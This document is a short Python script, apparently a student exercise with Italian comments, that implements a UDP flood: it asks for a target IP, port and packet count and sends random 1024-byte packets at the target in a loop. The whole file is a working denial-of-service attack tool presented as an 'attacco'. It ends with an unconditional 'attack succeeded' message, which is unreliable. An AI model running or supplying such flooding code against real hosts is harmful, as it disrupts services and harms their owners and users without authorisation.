import socket 
import random 
import time 

def udp_flood(ip_target,port_target,packetg_size,packet_count):

#Creo il socket UDP

    sock = (socket.socket(socket.AF_INET,socket.SOCK_DGRAM))

#Creo un pacchetto con grandenzza specifia

    pacchetto = random._urandom(packetg_size)

    print (f"Inizio attacco UDP flood verso {ip_target}:{port_target}")

    for i in range(packet_count):
        try:
    #invio del pacchetto all'indirizzo target 
            sock.sendto(pacchetto,(ip_target,port_target))
            
    #Tempo di attesa casuale tra 0 e 0.1 secondi
            delay = random.uniform(0.1, 0)
            time.sleep(delay)
            
            print (f"pacchetto {i+1} inviato")
        except Exception as e:
            print (f"Errore di invio del pacchetto {i+1}: {e}")

    print ("Attacco andato a segno")

if __name__=="__main__" :
#richeste input dell utente 
    ip_target = input("inserisci l IP target :")
    port_target = int(input ("inserisci la PORTA target :"))
    packet_size= 1024 
    packet_count= int(input("inserisci il numero dei pacchetti da inviare: "))

udp_flood(ip_target,port_target,packet_size,packet_count)

